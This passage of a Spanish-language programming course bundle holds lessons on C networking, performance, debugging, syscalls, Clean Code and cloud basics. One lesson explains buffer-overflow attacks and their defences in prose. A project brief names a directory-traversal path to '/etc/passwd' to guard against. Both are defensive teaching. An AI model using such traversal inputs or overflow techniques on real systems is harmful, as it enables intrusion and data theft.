- Debes convertir tus datos a un formato plano (Binario crudo, JSON, o Protobuf) y luego reconstruirlos al otro lado.

## 4. Bloqueo vs No-Bloqueo
- **Bloqueante**: Tu programa se "congela" en \`recv()\` hasta que lleguen datos. Es fcil de programar pero ineficiente.
- **No-Bloqueante**: El programa sigue corriendo. Si no hay datos, devuelve un error tipo \`EAGAIN\`.
- **Evolucin**: Los servidores modernos (Nginx, Node.js) usan \`epoll\` o \`io_uring\` para manejar 100,000 conexiones al mismo tiempo con un solo hilo.

## 5. El peligro de los Sockets
Trabajar con red es trabajar con lo desconocido. 
- Los datos pueden llegar fragmentados (la mitad de un mensaje ahora y la otra mitad en un segundo).
- Siempre debes programar pensando que la conexin puede morir en cualquier momento.

---

##  Historia
La API de Sockets que usas hoy en C es casi idntica a la "Berkeley Sockets" creada en 1983. Es una de las piezas de software ms estables y longevas de la historia.

##  Ejercicio
Busca la definicin de \`struct sockaddr_in\`. Por qu crees que necesita el campo \`sin_port\` en \`htons()\`?
(Pista: Host-to-Network Short, para arreglar el problema de Endianness).

##  Mantra
"En la red, nunca asumas que el mensaje lleg completo. Lee hasta encontrar tu propio final".
`,completed:!1},{id:"c-senior-23",title:"Leccin 23: Optimizacin de Rendimiento y Cache Awareness",level:"senior",content:`# Leccin 23: Optimizacin de Rendimiento y Cache Awareness

## 1. La Mentira de la Memoria Infinita
Muchos programadores creen que acceder a cualquier parte de la RAM tarda lo mismo. **Falso**.
- **Cach L1**: 1 nanosegundo.
- **RAM**: 100 nanosegundos (100 veces ms lento).
- **Disco**: Millones de nanosegundos.

Si tu programa tiene que ir a la RAM cada vez, el procesador estar el 99% del tiempo "aburrido" esperando datos.

## 2. Localidad Espacial: El Secreto de la Velocidad
Cuando pides un byte, la CPU trae un bloque de 64 bytes (una **Cache Line**) porque asume que pedirs lo que sigue.
- **Arrays**: Son ultra-rpidos porque estn pegados. La CPU los ama.
- **Listas Enlazadas**: Son lentas porque saltan por toda la RAM, rompiendo la cach cada vez.

\`\`\`c
// LENTO (Salto de fila en fila)
for(j=0; j<N; j++) for(i=0; i<N; i++) suma += matriz[i][j];

// RPIDO (Acceso lineal, aprovechando la cach)
for(i=0; i<N; i++) for(j=0; j<N; j++) suma += matriz[i][j];
\`\`\`
Solo cambiar el orden de los bucles puede hacer que tu cdigo sea **10 veces ms rpido**!

## 3. Branch Prediction (Prediccin de Ramas)
La CPU intenta adivinar si tu \`if\` ser verdad o mentira antes de ejecutarlo. Si adivina bien, el programa vuela. Si falla, tiene que tirar todo el trabajo y empezar de nuevo.
**Consejo**: Mantn tus datos ordenados para que los \`if\` sean predecibles.

## 4. Instrucciones SIMD
Las CPUs modernas pueden sumar 4, 8 o 16 nmeros **en un solo ciclo de reloj** usando instrucciones especiales (AVX, SSE). Un Senior usa estas funciones (Intrinsics) para procesar audio, video o IA a velocidades increbles.

## 5. El costo de las Ramas (Branchless Programming)
A veces, es mejor hacer matemticas que usar un \`if\`:
\`\`\`c
// Con IF
if (a > b) return a; else return b;

// Branchless (Sin saltos de CPU)
return a * (a > b) + b * (b >= a);
\`\`\`

---

##  Sabidura de Ingeniera
"La optimizacin prematura es la raz de todos los males (Donald Knuth). Primero haz que funcione, luego mide con \`perf\`, y solo entonces optimiza lo que realmente es lento".

##  Ejercicio
Por qu un array de structs es generalmente ms rpido que un array de punteros a structs?

##  Mantra
"Programa para la cach y el hardware te recompensar con milagros".
`,completed:!1},{id:"c-senior-24",title:"Leccin 24: Depuracin Forense: Cuando el Cdigo Muere",level:"senior",content:`# Leccin 24: Depuracin Forense: Cuando el Cdigo Muere

## 1. El Detective de Software
En el nivel Senior, ya no usas \`printf\` para arreglar bugs. Usas herramientas que te permiten "abrir el cadver" de tu programa mientras corre.

## 2. GDB: El Cirujano
El **GNU Debugger** te permite:
- Poner \`breakpoints\` (pausar el tiempo).
- Ver el \`backtrace\` (Quin llam a esta funcin que caus el crash?).
- Cambiar variables en caliente para ver qu pasa.
- \`watch\`: Un radar que te avisa exactamente en qu microsegundo una variable cambi de valor.

## 3. Valgrind: El Contador de Memoria
Ya lo mencionamos, pero su poder es mayor:
- Detecta **lectura de memoria no inicializada**.
- Detecta **escritura fuera de los lmites de un array**.
- Detecta **fugas de memoria**.
*Dato*: Valgrind enlentece tu programa 20 veces porque corre tu cdigo dentro de una CPU virtual. Es un sacrificio necesario.

## 4. Post-Mortem: Core Dumps
Cuando un programa en produccin muere, el SO genera un archivo \`core\`. Es una foto de toda la RAM en el momento del desastre.
\`\`\`bash
gdb ./mi_app core
\`\`\`
Puedes ver exactamente qu estaba haciendo el programa justo antes de morir, incluso si el crash ocurri en el medio de la noche en un servidor remoto.

## 5. El "Segmentation Fault" (Segfault)
Es el error ms famoso de C. Significa: *"Intentaste tocar una parte de la memoria que no te pertenece"*.
- Puede ser un puntero \`NULL\`.
- Puede ser un array desbordado.
- Puede ser tocar memoria que ya liberaste (\`Use-after-free\`).

## 6. Sanitizers (ASan, MSan)
Los compiladores modernos tienen "sensores" que puedes activar: \`-fsanitize=address\`. Hacen que el programa muera de forma elegante y te diga exactamente: "Error en la lnea 42, el bloque se liber en la lnea 10".

---

##  Mantra Senior
"Si no puedes reproducir un bug, no lo has arreglado; solo lo has asustado para que se esconda".

##  Ejercicio
Aprende los 4 comandos bsicos de GDB: \`run\`, \`break\`, \`next\` y \`print\`.

##  Reflexin
Depurar es como un juego de ajedrez contra ti mismo del pasado. Y tu versin del pasado casi siempre hizo trampa.
`,completed:!1},{id:"c-architect-25",title:"Leccin 25: Kernel Space, Syscalls y la Frontera del Hardware",level:"senior",content:`# Leccin 25: Kernel Space, Syscalls y la Frontera del Hardware

## 1. Los dos mundos: User vs Kernel
Tu programa no vive solo en la PC. Vive en una burbuja llamada **User Space**.
No tiene permiso para tocar el disco rgido, la tarjeta de red o el monitor directamente. Si lo intentara, la CPU lanzara una excepcin y matara tu programa.

## 2. Syscalls: El Puesto de Control
Para hacer algo "real", tu programa debe pedir permiso al **Kernel** (el jefe de seguridad). Esto se hace mediante una **Llamada al Sistema (Syscall)**.
- \`open()\`, \`read()\`, \`write()\`, \`socket()\`.
- Cuando haces \`printf\`, por debajo se llama a la syscall \`write\`.

## 3. El costo del Context Switch
Cambiar de "User Mode" a "Kernel Mode" es caro. La CPU tiene que guardar todos los registros, cambiar el mapa de memoria y verificar permisos.
**Tip de Arquitecto**: Un programa que hace mil syscalls pequeas (ej: escribir un archivo byte por byte) ser mil veces ms lento que uno que hace una sola syscall grande con un buffer de 4KB.

## 4. VFS: Todo es un Archivo
C y Unix usan un truco arquitectnico brillante llamado **Virtual File System**.
- El disco es un archivo.
- El teclado es un archivo.
- La tarjeta de sonido es un archivo.
Esto permite que el mismo cdigo que escribe en un archivo pueda enviar datos por internet o imprimir en pantalla.

## 5. Signals: Los Gritos del Sistema
Qu pasa cuando presionas \`Ctrl+C\`? El SO enva una seal (\`SIGINT\`) a tu programa. En C puedes "atrapar" estas seales para cerrar archivos o limpiar memoria antes de morir:
\`\`\`c
signal(SIGINT, mi_manejador_de_limpieza);
\`\`\`

## 6. Los Rings de la CPU
- **Ring 3**: Tu programa C (menos privilegios).
- **Ring 0**: El Kernel (poder total).
Cruzar del Ring 3 al 0 es la base de toda la computacin moderna.

---

##  Sabidura de Arquitecto
"Disear un sistema eficiente no es saber programar mucho, es saber cuntas veces le tienes que pedir permiso al Kernel para hacer tu trabajo".

##  Ejercicio
En Linux, corre \`strace ./a.out\`. Vers todas las llamadas al sistema que hace tu programa en tiempo real. Te sorprender cuntas cosas hace un simple "Hola Mundo"!

##  Mantra
"El Kernel es tu servidor. Trtalo bien y no lo satures con peticiones triviales".
`,completed:!1},{id:"c-architect-26",title:"Leccin 26: Seguridad de Sistemas: La Anatoma del Buffer Overflow",level:"senior",content:`# Leccin 26: Seguridad de Sistemas: La Anatoma del Buffer Overflow

## 1. El error ms costoso de la historia
El 70% de los hackeos a gran escala tienen su origen en errores de gestin de memoria en C. Como programador de sistemas, tu mejor defensa es entender cmo ataca el enemigo.

## 2. El Stack y la Direccin de Retorno
Recuerda la Leccin 7: cuando una funcin termina, la CPU mira una direccin en el **Stack** para saber a dnde volver en el \`main\`.
Si un hacker inyecta ms datos de los que caben en un buffer:
1.  Sobreescribe tus variables.
2.  Sobreescribe la **Direccin de Retorno**.
3.  Hace que la CPU, en lugar de volver al \`main\`, salte a ejecutar el cdigo que l envi (el "Shellcode").

## 3. Funciones Prohibidas
Nunca las uses en un entorno profesional:
- \`gets()\`: No tiene lmite de tamao. Es un suicidio digital.
- \`strcpy()\` y \`strcat()\`: salos solo si ests 100% seguro del tamao del destino.
- \`scanf("%s", ...)\`: Peligroso. Usa \`scanf("%19s", ...)\` para limitar.

## 4. Defensas del Arquitecto
Los sistemas modernos tienen escudos, pero t no debes confiar solo en ellos:
- **ASLR**: Mueve el mapa del programa en la RAM cada vez que corre para que el hacker no sepa dnde estn las direcciones.
- **Stack Canaries**: El compilador pone un valor secreto (un "canario") antes de la direccin de retorno. Si el canario muere (cambia su valor), el programa se cierra antes de que el hacker tome el control.
- **NX Bit (No-Execute)**: Marca la RAM de datos como prohibida para ejecutar cdigo.

## 5. El Factor Humano: "Trust but Verify"
La regla de oro de la seguridad en C es: **Nunca confes en los datos externos**. Ya sea que vengan del teclado, de un archivo o de internet, verifica su tamao ANTES de copiarlos a tu memoria sagrada.

---

##  Caso Real
El gusano Morris (1988), que casi tumba todo internet en sus inicios, us un buffer overflow en una funcin llamada \`fingerd\` escrita en C. 40 aos despus, seguimos cometiendo el mismo error.

##  Ejercicio de Reflexin
Si tienes \`char buffer[10]\` y recibes 11 bytes, qu variable crees que est en peligro adems del propio buffer? (Pista: La variable que hayas declarado justo antes o despus).

##  Mantra
"Programa como si el usuario fuera un hacker y la red fuera un campo de batalla".
`,completed:!1},{id:"c-architect-27",title:'Proyecto Final de Certificacin: El "Super-Server" en C',level:"senior",content:`# Proyecto Final de Certificacin: El "Super-Server" en C

## El Desafo Final: El Servidor Web Industrial
Has recorrido el camino desde los bits bsicos hasta la arquitectura del Kernel. Para demostrar tu maestra, no hars un "Hola Mundo". Construirs un **Servidor Web Multihilo** capaz de servir archivos reales a travs de internet.

## Especificaciones de Ingeniera

### 1. El Motor de Red (Networking)
Debes implementar el ciclo de vida del socket: \`socket -> bind -> listen -> accept\`. El servidor debe escuchar en el puerto 8080.

### 2. Gestin de Concurrencia (Multithreading)
- No uses un modelo "bloqueante". 
- Cada vez que un cliente se conecte, debes lanzar un hilo (\`pthread_create\`) para manejar esa peticin, permitiendo que el servidor atienda a cientos de personas a la vez.
- Implementa un **Logger Seguro** usando un \`Mutex\` para que los hilos no escriban sus logs uno encima del otro.

### 3. Protocolo HTTP (Parsing)
Debes leer la peticin del cliente y entender qu archivo est pidiendo (ej: \`GET /index.html\`).
- Cuidado con la seguridad! Asegrate de que el usuario no pida \`../../etc/passwd\` (ataque de Directory Traversal).

### 4. Acceso a Disco (VFS)
Usa las syscalls de archivos para leer el contenido del disco y enviarlo por el socket.

### 5. Calidad Industrial
- **Cero Fugas**: El programa debe pasar una prueba de 5 minutos de estrs y luego mostrar "0 bytes perdidos" en Valgrind.
- **Robustez**: Si un cliente se desconecta a mitad de camino, tu servidor no debe morir (maneja la seal \`SIGPIPE\`).

---

##  Tu Graduacin
Al completar este proyecto, habrs demostrado que posees las habilidades de un **Ingeniero de Sistemas de Nivel Senior**. Entiendes el hardware, dominas el software y respetas la seguridad.

##  Una ltima reflexin
C no es solo un lenguaje, es una forma de ver la realidad digital. Ahora que sabes cmo funcionan los engranajes, ningn otro lenguaje te parecer "mgico".

**Bienvenido al mundo de los creadores de infraestructura!**
`,completed:!1,isProject:!0}]},oD={id:"clean-code",title:"Clean Code & SOLID",description:"Aprende a escribir cdigo profesional, legible y mantenible siguiendo los estndares ms altos de la industria.",completed:!1,lessons:[{id:"clean-code-01-nombres-correctos",title:"Nombres Correctos - El Arte de Llamar a las Cosas",level:"junior",content:`# Leccin 01: Nombres Correctos - El Arte de Llamar a las Cosas

Escribir cdigo limpio no es un lujo, es una necesidad. Como Junior, tu primer objetivo es que tu cdigo se lea como un libro en ingls (o espaol) bien escrito.

## 1. El nombre debe decir la intencin
No uses nombres genricos o misteriosos. El nombre de una variable debe responder: Por qu existe?, Qu hace? y Cmo se usa?

*   **Mal:** \`const d = 5; // das transcurridos\`
*   **Bien:** \`const diasTranscurridos = 5;\`

## 2. Evita la desinformacin
No llames \`listaUsuarios\` a algo que no es una lista (Array). Si es un solo usuario, llmalo \`usuario\`.

## 3. Usa nombres pronunciables y buscables
Si no puedes pronunciarlo en una reunin sin parecer que ests dando un cdigo secreto, est mal. 
*   **Mal:** \`const fnyr = new Date().getFullYear();\`
*   **Bien:** \`const aoActual = new Date().getFullYear();\`

## 4. Funciones: Verbos, no sustantivos
Las funciones hacen cosas. Sus nombres deben ser verbos.
*   **Mal:** \`function datos() { ... }\`
*   **Bien:** \`function obtenerDatosUsuario() { ... }\`

---

### Concepto Junior:
Escribe tu cdigo pensando que la persona que lo va a leer dentro de 6 meses es una persona violenta que sabe dnde vives. Esa persona podras ser t mismo!

### Ejercicio Mental 1:
Mira este nombre: \`const temp = 25;\`. Si estamos en una App de clima, es correcto? Y si estamos en una App de cocina? Cmo lo mejoraras en cada caso?
`,completed:!1},{id:"clean-code-02-funciones-y-dry",title:"Funciones Pequeas y el principio DRY",level:"junior",content:`# Leccin 02: Funciones Pequeas y el principio DRY

En el Clean Code, menos es ms. Una funcin gigante que hace 20 cosas es una pesadilla para testear y arreglar.

## 1. Haz una sola cosa (Single Responsibility)
Una funcin debe tener un solo propsito. Si tu funcin tiene un comentario que dice "Primero valida, luego guarda y despus enva el mail", entonces debe dividirse en 3 funciones.

## 2. Pocos parmetros
Lo ideal es que una funcin tenga 0, 1 o 2 parmetros. Si necesitas pasar 5 cosas, probablemente debas pasar un **objeto**.
*   **Mal:** \`function crearUsuario(nombre, edad, email, direccion, ciudad) { ... }\`
*   **Bien:** \`function crearUsuario(datosUsuario) { ... }\`

## 3. DRY: Don't Repeat Yourself (No te repitas)
Si copias y pegas un bloque de cdigo en dos lugares diferentes, ests creando una deuda tcnica. 
*   **Consecuencia:** Cuando quieras cambiar una lgica, tendrs que buscar todos los lugares donde la pegaste. Si te olvidas de uno, tendrs un bug.

## 4. Evita los efectos secundarios
Una funcin no debera modificar variables globales o externas sin que el programador se de cuenta. Debe ser predecible: le doy X, me devuelve Y.

---

### Misin Junior:
Cada vez que escribas un \`if\` muy largo o una funcin de ms de 20 lneas, pregntate: "Puedo extraer esto a una funcin pequea con un nombre descriptivo?".

### Ejercicio Mental 2:
Tienes dos funciones que calculan el precio final: una para Argentina (+21% IVA) y otra para Mxico (+16% IVA). El resto de la lgica (descuento, envo) es igual. Cmo aplicaras DRY aqu?
`,completed:!1},{id:"clean-code-03-errores-comunes",title:"Errores Comunes de Cdigo Sucio",level:"junior",content:`# Leccin 03: Errores Comunes de Cdigo Sucio

Para ser un pro, primero hay que dejar de cometer errores de novato. Vamos a cazar los sntomas del "Cdigo Oloroso" (Code Smells).

## 1. Comentarios obvios
No comentes lo que el cdigo ya dice. Si necesitas un comentario para explicar qu hace el cdigo, es que el cdigo no es lo suficientemente claro.
*   **Mal:** \`i++; // incrementa i en 1\`
*   **Bien:** (Simplemente el cdigo, o un mejor nombre de variable).
*   **Cundo s comentar:** Para explicar el "Por qu" de una decisin extraa, no el "Qu".

## 2. Cdigo Muerto
Funciones que nadie usa, variables declaradas por las dudas, o trozos de cdigo comentados "por si los necesito despus".
*   **Regla:** Si no se usa hoy, se borra. Para eso existe Git, para recuperar cosas viejas si hace falta.

## 3. Niveles de indentacin extremos (El cdigo flecha)
Evita tener \`if\` dentro de \`if\` dentro de \`for\` dentro de \`if\`. 
*   **Tcnica:** Usa **Guard Clauses** (Clusulas de guarda).
\`\`\`javascript
// Mal
function inscribir(estudiante) {
    if (estudiante != null) {
        if (estudiante.edad > 18) {
            // lgica larga...
        }
    }
}

// Bien (Clean)
function inscribir(estudiante) {
    if (estudiante == null) return;
    if (estudiante.edad <= 18) return;
    
    // lgica principal sin niveles extraos
}
\`\`\`

---

### Verdad Junior:
Tu cdigo no es para la computadora (ella entiende binario). Tu cdigo es para que **otros humanos** puedan mantenerlo.

### Ejercicio Prctico 3:
Busca en tu proyecto algn archivo con cdigo comentado que no se use. **Brralo**. Siente la paz interior.
`,completed:!1},{id:"clean-code-04-principios-solid",title:"Principios SOLID (Introduccin)",level:"semi-senior",content:`# Leccin 04: Principios SOLID (Introduccin)

Como Semi-Senior, ya no solo escribes cdigo legible, escribes cdigo **robusto**. El acrnimo SOLID son los 5 pilares de la arquitectura orientada a objetos (y funcional).

## 1. S: Single Responsibility (Responsabilidad nica)
Una clase o mdulo debe tener **una sola razn para cambiar**. Si tu archivo maneja la lgica de pagos Y adems genera el PDF del recibo, viola el principio S.

## 2. O: Open/Closed (Abierto/Cerrado)
El software debe estar abierto para su extensin, pero cerrado para su modificacin. 
*   **Idea:** Debes poder agregar nuevas funciones sin tener que abrir y cambiar el cdigo que ya funciona.

## 3. L: Liskov Substitution
Si tienes una clase \`Padre\` y una clase \`Hijo\`, deberas poder usar al \`Hijo\` en cualquier lugar donde uses al \`Padre\` sin que nada se rompa.

## 4. I: Interface Segregation
Es mejor tener muchas interfaces pequeas y especficas que una sola interfaz gigante y obligatoria. No obligues a nadie a depender de mtodos que no usa.

## 5. D: Dependency Inversion (Inversin de Dependencias)
No dependas de cosas concretas, depende de **abstracciones**. 
*   **Ejemplo:** Tu cdigo no debe depender de "MySQL", debe depender de una "Base de Datos". As, si cambias la tecnologa, tu lgica principal ni se entera.

---

### Lo que hace un Semi-Senior:
Aplica SOLID no como una ley religiosa, sino como una gua para evitar que el cdigo se vuelva un "fideo" imposible de desenredar.

### Ejercicio 4:
Si tienes una clase \`Animal\` con un mtodo \`volar()\`, y creas una subclase \`Perro\`. Viola el principio Liskov? Cmo lo arreglaras?
`,completed:!1},{id:"clean-code-05-refactor-y-errores",title:"Refactorear y Manejar Errores como un Pro",level:"semi-senior",content:`# Leccin 05: Refactorear y Manejar Errores como un Pro

Refactorear no es "reescribir todo". Es mejorar la estructura interna del cdigo sin cambiar su comportamiento externo.

## 1. Cundo refactorear
*   Cuando vas a agregar una nueva funcionalidad y el cdigo actual te molesta.
*   Cuando ves un "Code Smell" (olor a cdigo sucio).
*   **Regla de Boy Scout:** Deja el cdigo un poquito ms limpio de como lo encontraste.

## 2. Manejo de Errores Profesional
Como principiante usas \`try/catch\` para que la app no explote. Como Semi-Senior, los usas para dar informacin valiosa.
*   **No silencies errores:** Nunca hagas un \`catch(e) {}\`. Si ocurre un error, debes loguearlo o informar al usuario.
*   **Lanza errores con sentido:** \`throw new ValidationError('El email es obligatorio')\` es mucho mejor que \`throw new Error('Fall todo')\`.

## 3. El Tringulo de la Muerte
Usa objetos para devolver resultados exitosos o fallidos.
\`\`\`javascript
// Mal: devuelve null o undefined y obliga a mil ifs
const user = findUser(id); 

// Pro: Devuelve un objeto con estado
const { data, error, loading } = useUser(id);
\`\`\`

---

### Misin Semi-Senior:
La refactorizacin solo es segura si tienes **Tests**. Nunca refactorees a ciegas; primero asegura que tienes una red de seguridad que te avise si rompiste algo.

### Ejercicio 5:
Mira una funcin vieja tuya. Aplica la tcnica de **Extraer Funcin** (llevar un pedazo de lgica a una funcin nueva con nombre claro). Sigue funcionando todo?
`,completed:!1},{id:"clean-code-06-abstracciones",title:"Abstracciones - El equilibrio del poder",level:"semi-senior",content:`# Leccin 06: Abstracciones - El equilibrio del poder

Una **abstraccin** es ocultar detalles complejos detrs de una interfaz simple. Pero cuidado: una mala abstraccin es peor que no tener ninguna.

## 1. El peligro de la Abstraccin Prematura
Un error comn de los Semi-Senior es querer hacer todo "genrico" antes de tiempo. 
*   **Regla de Tres:** No hagas una abstraccin hasta que no hayas repetido el mismo cdigo al menos 3 veces.

## 2. Acoplamiento y Cohesin
*   **Acoplamiento:** Qu tan "pegadas" estn dos partes del cdigo. Queremos bajo acoplamiento (que se puedan separar fcil).
*   **Cohesin:** Qu tanto tienen que ver las cosas dentro de un mdulo. Queremos alta cohesin (que todo lo que est en \`AuthService\` sea realmente de Auth).

## 3. Composicin sobre Herencia
En lugar de crear jerarquas gigantes (\`Animal -> Mamifero -> Perro -> Caniche\`), prefiere componer comportamientos.
*   "Un perro **tiene** capacidad de ladrar", en lugar de "Un perro **es** un ladrador".

---

### Verdad de Arquitectura:
Duplicar cdigo es un poco feo, pero la abstraccin equivocada es un desastre que te va a perseguir por aos. 

### Ejercicio Mental 6:
Ests creando un botn que a veces tiene icono a la izquierda y a veces a la derecha. Creas un solo componente con 20 props opcionales (Abstraccin Gigante) o creas 3 componentes pequeitos que se combinan? Cul es ms fcil de mantener?
`,completed:!1},{id:"clean-code-07-practica-clean-code",title:"Clean Code & SOLID",level:"semi-senior",content:`# Ejercicios y Evaluacin: Clean Code & SOLID

Demuestra que escribes cdigo que tus compaeros amarn leer.

---

## Nivel Junior: Detective de Nombres
**Consigna:** Tienes el siguiente cdigo. Renombra las variables para que sean 100% claras.
\`\`\`javascript
function p(a, b) {
    let x = a.map(i => i.val * b);
    return x.reduce((s, v) => s + v, 0);
}
\`\`\`
*Pista:* \`a\` es una lista de productos, \`b\` es el porcentaje de impuesto. \`p\` calcula el total con impuestos.

---

## Nivel Semi-Senior: Refactor de Responsabilidad
**Consigna:** Tienes una funcin \`guardarYSubirFoto(archivo, usuarioId)\`. 
1. Valida que el archivo sea una imagen.
2. Cambia el tamao de la imagen.
3. Lo sube a AWS S3.
4. Guarda la URL en la base de datos de MongoDB.
5. Enva un log de xito a Datadog.

*Pregunta:* Cmo dividiras esta funcin aplicando el principio **S (Single Responsibility)**? Nombra las funciones o clases que crearas.

---

## Evaluacin de Principios
*   Explica con tus palabras qu significa que un cdigo est "Cerrado para la modificacin pero abierto para la extensin".
*   Qu es un **Code Smell** y por qu es importante detectarlos a tiempo?
*   Por qu se recomienda evitar el uso excesivo de comentarios explicativos?

---

### Resultado esperado:
No buscamos la solucin perfecta, sino un razonamiento que priorice la **legibilidad** y la **facilidad de cambio** a futuro. 
`,completed:!1,isProject:!0},{id:"clean-code-08-singleton-factory",title:"Creacionales - Singleton y Factory",level:"senior",content:`# Leccin 08: Creacionales - Singleton y Factory

En el nivel Senior, los Patrones de Diseo son soluciones estndar a problemas comunes. No son reglas, son herramientas para que tu cdigo sea ms flexible.

## 1. Patrn Singleton
Asegura que una clase tenga **una nica instancia** en toda la aplicacin y proporciona un punto de acceso global.
*   **Caso Real en JS/TS:** Una conexin a una Base de Datos o un servicio de Logging. No quieres abrir 100 conexiones al mismo tiempo.
*   **Ejemplo:**
\`\`\`typescript
class DatabaseConnection {
  private static instance: DatabaseConnection;
  private constructor() {} // Nadie puede hacer 'new' fuera de aqu

  public static getInstance(): DatabaseConnection {
    if (!DatabaseConnection.instance) {
      DatabaseConnection.instance = new DatabaseConnection();
    }
    return DatabaseConnection.instance;
  }
}
\`\`\`

## 2. Patrn Factory (Fbrica)
Define una interfaz para crear objetos, pero deja que las subclases decidan qu clase instanciar.
*   **Caso Real:** Un sistema que maneja diferentes tipos de notificaciones (Email, SMS, Push). El cdigo principal no debe saber cmo se crea cada una.
*   **Ventaja:** Si maana agregas "WhatsApp", no tocas la lgica de negocio, solo agregas una pieza a la fbrica.

---

### Visin Senior:
Un patrn mal aplicado es peor que no usar patrones. Usa un Singleton solo si es ESTRICTAMENTE necesario tener una sola instancia; abusar de l convierte tu cdigo en una maraa de variables globales difciles de testear.
`,completed:!1},{id:"clean-code-09-strategy-observer",title:"Comportamiento - Strategy y Observer",level:"senior",content:`# Leccin 09: Comportamiento - Strategy y Observer

Estos patrones permiten que tu cdigo sea dinmico y que diferentes partes del sistema reaccionen entre s sin estar "pegadas".

## 1. Patrn Strategy (Estrategia)
Permite definir una familia de algoritmos, poner cada uno en una clase separada y hacer que sus objetos sean intercambiables.
*   **Caso Real:** Diferentes mtodos de pago (Stripe, PayPal, Crypto).
*   **Implementacin:** Tu clase \`OrderProcessor\` recibe una "estrategia" de pago. No le importa si es PayPal o Stripe, solo sabe que tiene un mtodo \`.pay()\`.

## 2. Patrn Observer (Observador)
Define una relacin de uno a muchos: cuando un objeto cambia su estado, todos sus dependientes son notificados automticamente.
*   **Caso Real:** El estado de una compra. Cuando el paquete se mueve, la App de logstica, el usuario (va mail) y el sistema de inventario "observan" y reaccionan.
*   **En JavaScript:** Es la base de los eventos (\`addEventListener\`) y de cmo funcionan libreras como Redux o RxJS.

---

### Misin Senior:
Usa **Strategy** para eliminar \`if/else\` gigantes o \`switch\` que crecen cada vez que agregas una funcionalidad. Si tu cdigo tiene muchos "casos especiales", probablemente necesites una estrategia.
`,completed:!1},{id:"clean-code-10-patron-repository",title:"Persistencia - El Patrn Repository",level:"senior",content:`# Leccin 10: Persistencia - El Patrn Repository

El patrn **Repository** es fundamental para separar la lgica de negocio de la infraestructura (la base de datos).

## 1. El concepto
Un Repositorio se comporta como una coleccin de objetos en memoria. El resto de la App le pide cosas al Repositorio, y este sabe cmo buscarlas en la DB.

## 2. Por qu es vital para Seniors
*   **Independencia total:** Si decides cambiar de MongoDB a PostgreSQL, el \`Service\` que usa el repositorio no cambia ni una lnea.
*   **Testing:** Puedes crear un \`MockRepository\` que devuelva datos fijos para tus tests sin necesidad de levantar una base de datos real.

## 3. Ejemplo en TypeScript
\`\`\`typescript
interface UserRepository {
  findById(id: string): Promise<User>;
  save(user: User): Promise<void>;
}

// Implementacin concreta
class MongoUserRepository implements UserRepository {
  async findById(id: string) { /* Lgica de MongoDB */ }
  async save(user: User) { /* Lgica de MongoDB */ }
}
\`\`\`

---

### Verdad Tcnica:
Muchos desarrolladores dicen "Nunca voy a cambiar mi base de datos". Pero el patrn Repository te salva tambin cuando quieres agregar una capa de **Cach** o cuando necesitas hacer migraciones complejas. Es flexibilidad pura.
`,completed:!1},{id:"clean-code-11-practica-senior",title:"Ejercicios Senior: Patrones de Diseo en Accin",level:"senior",content:`# Ejercicios Senior: Patrones de Diseo en Accin

Demuestra tu nivel arquitectnico resolviendo estos escenarios de la vida real.

---

## 1. El Dilema del Pago (Strategy)
**Escenario:** Tienes una aplicacin de E-commerce. Debes soportar pagos con Tarjeta, PayPal y Transferencia Bancaria. Cada uno tiene comisiones y pasos distintos.
*   **Desafo:** Crea la estructura de clases usando el patrn **Strategy** para que agregar un cuarto mtodo de pago no requiera modificar la clase principal de \`Orden\`.

## 2. El Log Centralizado (Singleton)
**Escenario:** Diferentes servicios de tu aplicacin (Auth, Payment, Inventory) necesitan escribir en el mismo archivo de log de forma ordenada.
*   **Desafo:** Implementa un \`Logger\` usando **Singleton**. Cmo aseguraras que dos servicios no intenten "instanciar" el logger al mismo tiempo en un entorno asincrnico?

## 3. Notificaciones Multi-canal (Factory)
**Escenario:** El sistema debe enviar avisos. Si el usuario es VIP, se enva SMS; si es normal, Email.
*   **Desafo:** Disea una \`NotificationFactory\`. Qu interfaces definiras para que el cdigo que pide la notificacin no sepa si se est enviando un SMS o un Mail?

---

### Criterio Senior:
No evaluamos si el cdigo compila (eso lo hace la computadora). Evaluamos si el diseo permite que el sistema crezca sin volverse un caos de dependencias. 
`,completed:!1,isProject:!0}]},sD={id:"cloud-computing",title:"Cloud Computing Fundamentals",description:"Aprende a desplegar y gestionar aplicaciones en la nube con AWS.",completed:!1,track:"Herramientas Esenciales",lessons:[{id:"cloud-01-fundamentos",title:"Fundamentos de Cloud Computing",level:"junior",content:`# Leccin 1: Fundamentos de Cloud Computing

La "nube" no es ms que la computadora de otra persona. Alquilada.

## 1. Qu es Cloud Computing?
Es el modelo de consumir recursos de IT (servidores, bases de datos, almacenamiento) a travs de internet, pagando solo por lo que usas (Pay-as-you-go).
*   **Antes (On-Premise):** Comprabas servidores, pagabas electricidad, aire acondicionado, admin de sistemas.
*   **Ahora (Cloud):** Haces clic y tienes un supercomputador en segundos.

## 2. Modelos de Servicio (La Pizza as a Service)
*   **IaaS (Infrastructure as a Service):** Te alquilan la cocina y el horno. T traes la masa, el queso y cocinas.
    *   Ej: Amazon EC2, Google Compute Engine. VM (Virtual Machines).
    *   *Control:* Alto. *Responsabilidad:* Alta (instalar OS, parches).
*   **PaaS (Platform as a Service):** Te alquilan la cocina, el horno y te dan la masa lista. T pones los ingredientes.
    *   Ej: Heroku, AWS Elastic Beanstalk, Google App Engine.
    *   *Control:* Medio. *Responsabilidad:* Media (solo tu cdigo).
*   **SaaS (Software as a Service):** Te traen la pizza hecha a la mesa.
    *   Ej: Gmail, Salesforce, Dropbox, Netflix.
    *   *Control:* Bajo. *Responsabilidad:* Ninguna (solo usar).

## 3. Tipos de Nube
*   **Pblica:** AWS, Azure, Google. Compartes hardware (aislado lgicamente) con otros clientes. Barata y elstica.
*   **Privada:** Servidores dedicados solo para ti. Ms seguridad, ms caro, menos elstica. Para bancos o gobiernos.
*   **Hbrida:** Usas tu datacenter privado para datos sensibles y la nube pblica para cuando explota el trfico.

---

### Misin Junior:
Investiga el concepto de "CapEx vs OpEx". Por qu las empresas prefieren pasar de Capital Expenditure (Invertir millones en hardware antes de empezar) a Operational Expenditure (Pagar mensualmente por uso)?
`,completed:!1},{id:"cloud-02-proveedores",title:"Los Gigantes (AWS, Azure, GCP)",level:"junior",content:`# Leccin 2: Los Gigantes (AWS, Azure, GCP)

Hay muchos proveedores, pero 3 dominan el mundo.

## 1. AWS (Amazon Web Services)
*   **El Rey:** Lder indiscutible de mercado. Naci en 2006.
*   **Filosofa:** Tiene servicios para TODO. Curva de aprendizaje empinada, pero es el estndar de la industria.
